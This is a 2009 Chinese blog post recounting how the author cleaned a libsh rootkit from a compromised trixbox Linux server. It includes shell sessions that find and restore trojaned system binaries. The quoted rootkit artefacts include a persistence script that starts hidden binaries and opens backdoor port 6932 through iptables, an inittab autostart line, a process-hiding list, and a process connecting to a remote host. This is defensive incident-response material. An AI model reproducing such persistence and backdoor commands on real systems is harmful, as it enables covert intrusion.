---
author: abloz
comments: true
date: 2009-07-22 06:45:00+00:00
layout: post
link: http://abloz.com/index.php/2009/07/22/and-hacking-contest/
slug: and-hacking-contest
title: 和黑客的较量
wordpress_id: 923
categories:
- 技术
---

周海汉/文 2009.7.27

以前一起创业的同事，突然给我打电话，说运行的一台tribox机器被攻击了。考虑到我linux比较熟，特来求助。

我通过远程桌面连接那台linux，发现ssh 2根本连不上。ssh v1还幸好连上了。进去查看ssh配置，无异常，重启sshd发现端口占用。netstat看不到有程序占用sshd的端口。

cd操作，root的shell主目录被切换到/usr/lib/libsh

但 ls -l /usr/lib >tmp

grep libsh tmp

为空，说明根本看不见libsh

以root权限执行删除，移动，改名均提示无权限。

rm  -rf /usr/lib/libsh

提示没有操作权限。

ps -ef 看到有可疑的进程如下：

ls -c < x.x.x.x:yyyy > /dev/null 2>&1

其中x.x.x.x 是IP，用ip138一查，是波兰的一个IP地址。显然这个IP是黑客的跳板。

黑客很可能通过修改过的ls来远程发信息。

ls /usr/bin

发现 ls,top,ps,netstat等关键进程都被替换了。其用户不是root，而是112，用户组是114. 这些二进制文件也都不可删改。

下面是部分操作：

find / -nouser

/etc/shell/stealth
/etc/shell/bash
/etc/shell/randfiles
/etc/shell/randfiles/randnicks.e
/etc/shell/randfiles/randpickup.e
/etc/shell/randfiles/randsignoff.e
/etc/shell/randfiles/randsay.e
/etc/shell/randfiles/randkicks.e
/etc/shell/randfiles/randaway.e
/etc/shell/randfiles/randversions.e
/etc/shell/randfiles/randinsult.e
/etc/shell/cyc.set
/etc/shell/cyc.levels
/etc/shell/cyc.help
/etc/shell/cyc.acc
/etc/shell/cyc.pid
/root/libsh1/hide1
/root/libsh1/.bashrc
/usr/bin/dir
/usr/bin/find
/usr/bin/pstree
/usr/bin/top
/usr/bin/md5sum
/bin/netstat
/bin/ps
/bin/ls
/sbin/ttymon
/sbin/ttyload
/sbin/ifconfig

[trixbox1.localdomain .backup]# pwd
/root/libsh1/.backup

[trixbox1.localdomain .backup]# ls -l
total 740
-rwxr-xr-x 1 root root  93560 Jun 27 03:23 dir
-rwxr-xr-x 1 root root 151244 Jun 27 03:23 find
-rwxr-xr-x 1 root root  71528 Jun 27 03:23 ifconfig
-rwxr-xr-x 1 root root  93560 Jun 27 03:23 ls
-rwxr-xr-x 1 root root  27728 Jun 27 03:23 md5sum
-rwxr-xr-x 1 root root 121140 Jun 27 03:23 netstat
-r-xr-xr-x 1 root root  79036 Jun 27 03:23 ps
-rwxr-xr-x 1 root root  18644 Jun 27 03:23 pstree
-r-xr-xr-x 1 root root  58104 Jun 27 03:23 top


[trixbox1.localdomain .backup]# lsattr /bin/ps
s---ia------- /bin/ps

[trixbox1.localdomain .backup]# chattr -iau /bin/ps
[trixbox1.localdomain .backup]# cp ps /bin/.
cp: overwrite `/bin/./ps'? y
[trixbox1.localdomain .backup]# chattr -iau /bin/netstat /bin/ls
[trixbox1.localdomain .backup]# cp netstat /bin/netstat
cp: overwrite `/bin/netstat'? y
[trixbox1.localdomain .backup]# cp ls /bin/ls
cp: overwrite `/bin/ls'? y
[trixbox1.localdomain .backup]# chattr -iau /usr/bin/{top,pstree,dir,md5sum,find}
[trixbox1.localdomain .backup]# cp {top,pstree,dir,md5sum,find} /usr/bin/.
cp: overwrite `/usr/bin/./top'? y
cp: overwrite `/usr/bin/./pstree'? y
cp: overwrite `/usr/bin/./dir'? y
cp: overwrite `/usr/bin/./md5sum'? y
cp: overwrite `/usr/bin/./find'? y

[trixbox1.localdomain .backup]# netstat -anp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name
tcp        0      0 0.0.0.0:6600                0.0.0.0:*                   LISTEN      2030/ircd
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      1979/mysqld
tcp        0      0 0.0.0.0:5038                0.0.0.0:*                   LISTEN      2306/asterisk
tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      1651/portmap
tcp        0      0 0.0.0.0:1010                0.0.0.0:*                   LISTEN      1676/rpc.statd
tcp        0      0 0.0.0.0:6932                0.0.0.0:*                   LISTEN      2440/ttyload
tcp        0      0 10.1.0.13:3306              60.10.140.68:3221           ESTABLISHED 1979/mysqld
tcp        0      0 :::50021                    :::*                        LISTEN      1838/sshd
tcp        0      0 :::88                       :::*                        LISTEN      9351/httpd
tcp        0      0 :::443                      :::*                        LISTEN      9351/httpd
tcp        0      0 ::ffff:10.1.0.13:50021      ::ffff:10.1.0.68:2967       ESTABLISHED 10403/2
udp        0      0 0.0.0.0:32768               0.0.0.0:*                               1790/mDNSResponder
udp        0      0 0.0.0.0:5060                0.0.0.0:*                               2306/asterisk
udp        0      0 0.0.0.0:69                  0.0.0.0:*                               1854/xinetd
udp        0      0 0.0.0.0:4569                0.0.0.0:*                               2306/asterisk
udp        0      0 0.0.0.0:5353                0.0.0.0:*                               1790/mDNSResponder
udp        0      0 0.0.0.0:1004                0.0.0.0:*                               1676/rpc.statd
udp        0      0 0.0.0.0:1007                0.0.0.0:*                               1676/rpc.statd
udp        0      0 0.0.0.0:111                 0.0.0.0:*                               1651/portmap
raw        0      0 0.0.0.0:1                   0.0.0.0:*                   7           2447/ttymon
...

[trixbox1.localdomain .backup]# ls -l /lib/libsh.so
total 728
-rwxr-xr-x 1 root root 722684 Jun 27 03:23 bash
-rw-r--r-- 1 root  114    478 Jun 27 03:23 shdcf
-rwx------ 1  122  114    525 Apr 17  2003 shhk
-rwx------ 1  122  114    329 Apr 17  2003 shhk.pub
-rwx------ 1  122  114    512 Jul 21 09:55 shrs
[trixbox1.localdomain .backup]# mv /lib/libsh.so/ /root/libsh.so_bak
mv: cannot move `/lib/libsh.so/' to `/root/libsh.so_bak': Operation not permitted
[trixbox1.localdomain .backup]# chattr -iau /lib/libsh.so/
[trixbox1.localdomain .backup]# mv /lib/libsh.so/ /root/libsh.so_bak

[trixbox1.localdomain .backup]# find / -group 114
/root/libsh1/.sniff/shsniff
/root/libsh1/.sniff/shp
/root/libsh1/hide1
/root/libsh1/shsb
/root/libsh1/.bashrc
/root/libsh.so_bak/shhk.pub
/root/libsh.so_bak/shdcf
/root/libsh.so_bak/shhk
/root/libsh.so_bak/shrs
/usr/bin/dir
/usr/bin/find
/usr/bin/pstree
/usr/bin/top
/usr/bin/md5sum
/bin/netstat
/bin/ps
/bin/ls
find: /proc/25743/task/25743/fd/4: No such file or directory
find: /proc/25743/fd/4: No such file or directory
/sbin/ttymon
/sbin/ttyload
/sbin/ifconfig

[trixbox1.localdomain .backup]# chmod 700 /sbin/ifconfig
[trixbox1.localdomain .backup]# chown root:root /sbin/ifconfig
[trixbox1.localdomain .backup]# ll /sbin/ifconfig
-rwx------ 1 root root 71528 Jul 21 23:38 /sbin/ifconfig

[trixbox1.localdomain ~]# vi /etc/inittab

# Run xdm in runlevel 5
x:5:respawn:/etc/X11/prefdm -nodaemon
# Loading standard ttys
0:2345:once:/usr/sbin/ttyload
# Run gettys in standard runlevels

[trixbox1.localdomain .backup]# find / -name "*" -exec grep -l "ttyload" {} ;
/etc/inittab
/etc/rc.d/nouser
/etc/prelink.cache
/usr/include/proc.h
/usr/sbin/ttyload


[trixbox1.localdomain ~]# vi /usr/sbin/ttyload

/sbin/ttyload -q >/dev/null 2>&1
/sbin/ttymon >/dev/null 2>&1
/sbin/ttylib >/dev/null 2>&1
/sbin/iptables -I INPUT -p tcp --dport 6932 -j ACCEPT
iptables -I INPUT -p tcp --dport 6932 -j ACCEPT

[trixbox1.localdomain ~]# netstat -anp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name
tcp        0      0 0.0.0.0:6600                0.0.0.0:*                   LISTEN      2030/ircd
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      1979/mysqld
tcp        0      0 0.0.0.0:5038                0.0.0.0:*                   LISTEN      2306/asterisk
tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      1651/portmap
tcp        0      0 0.0.0.0:1010                0.0.0.0:*                   LISTEN      1676/rpc.statd
tcp        0      0 0.0.0.0:6932                0.0.0.0:*                   LISTEN      2440/ttyload          //attack!!!
tcp        0      0 10.1.0.13:3306              60.10.140.68:3221           ESTABLISHED 1979/mysqld
tcp        0      0 :::50021                    :::*                        LISTEN      1838/sshd
tcp        0      0 :::88                       :::*                        LISTEN      9351/httpd
tcp        0      0 :::443                      :::*                        LISTEN      9351/httpd
tcp        0      0 ::ffff:10.1.0.13:50021      ::ffff:10.1.0.68:2967       ESTABLISHED 10403/0
udp        0      0 0.0.0.0:32768               0.0.0.0:*                               1790/mDNSResponder
udp        0      0 0.0.0.0:5060                0.0.0.0:*                               2306/asterisk
udp        0      0 0.0.0.0:69                  0.0.0.0:*                               1854/xinetd
udp        0      0 0.0.0.0:4569                0.0.0.0:*                               2306/asterisk
udp        0      0 0.0.0.0:5353                0.0.0.0:*                               1790/mDNSResponder
udp        0      0 0.0.0.0:1004                0.0.0.0:*                               1676/rpc.statd
udp        0      0 0.0.0.0:1007                0.0.0.0:*                               1676/rpc.statd
udp        0      0 0.0.0.0:111                 0.0.0.0:*                               1651/portmap
raw        0      0 0.0.0.0:1                   0.0.0.0:*                   7           2447/ttymon


[trixbox1.localdomain .backup]# cat /etc/rc.d/nouser
/etc/shell/stealth
/etc/shell/bash
/etc/shell/randfiles
/etc/shell/randfiles/randnicks.e
/etc/shell/randfiles/randpickup.e
/etc/shell/randfiles/randsignoff.e
/etc/shell/randfiles/randsay.e
/etc/shell/randfiles/randkicks.e
/etc/shell/randfiles/randaway.e
/etc/shell/randfiles/randversions.e
/etc/shell/randfiles/randinsult.e
/etc/shell/cyc.set
/etc/shell/cyc.levels
/etc/shell/cyc.help
/etc/shell/cyc.acc
/etc/shell/cyc.pid
/root/libsh1/hide1
/root/libsh1/.bashrc
/usr/bin/dir
/usr/bin/find
/usr/bin/pstree
/usr/bin/top
/usr/bin/md5sum
/bin/netstat
/bin/ps
/bin/ls
/sbin/ttymon
/sbin/ttyload
/sbin/ifconfig

[trixbox1.localdomain .backup]# cat /usr/include/proc.h
3 burim
3 mirkforce
3 synscan
3 ttyload
3 ttylib
3 shsniff
3 ttymon
3 shsb
3 shp
3 hide
4 ttyload

以上是我将/usr/lib/libsh 修改属性后移到/root下面，再一步一步找出rootkit可能感染了哪些文件。可以看出感染的文件很杂。核心文件都指向ttyload。/usr /lib/libsh里面有隐藏目录.backup，应该是正确的原二进制文件的备份，所以一边修改属性，一边恢复ls,top,netstat,ps等关键二进制可执行文件。

最后将所有被感染的文件替换成干净版本或删除，恢复sshd的v2版本连接，crontab里面一分钟清一次log的代码清除，inittab文件里面自动启动ttyload的代码清除。让他们用Nessus和cktoolkit之类的工具扫描一下漏洞。不确定是系统漏洞还是asterisk的漏洞或者是php的http漏洞。把补丁补上，以免再次被攻击。  
  


![](http://img.zemanta.com/pixy.gif?x-id=1c954aec-c3dd-8578-a130-b909ead59d56)
